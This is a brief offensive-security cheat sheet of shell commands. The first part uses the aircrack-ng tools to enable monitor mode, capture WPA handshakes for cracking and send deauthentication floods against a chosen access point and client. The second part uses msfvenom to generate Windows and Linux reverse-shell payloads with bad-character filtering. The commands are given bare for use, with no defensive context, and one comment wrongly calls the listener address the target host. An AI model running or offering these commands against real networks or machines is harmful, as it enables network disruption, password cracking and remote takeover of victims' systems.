

## WIFI with aireplay
airmon-ng start $iface # monitor mode
airodump-ng $mon
(airodump-ng --bssid xx:xx:xx:xx:xx:xx -c 1-13 [--write WPA_crack_file] <iface>)
aireplay-ng --deauth 100 -a $some_MAC -c $other_MAC $mon"

## Windows reverse shell
msfvenom -p windows/shell_reverse_tcp LHOST=eth0 LPORT=8080 EXITFUNC=thread \
-f raw -b "\x00\x09\x0d\x0a\x20\xff" -n 32 > warhead.txt
## Linux reverse shell
msfvenom -p linux/x64/shell_reverse_tcp \ # Specify the payload
            LHOST=127.0.0.1             \ # Target host to connect
            LPORT=4444                  \ # Target port
         -b '\x00'                      \ # Bad characters
         -f python                        # Format of the payload

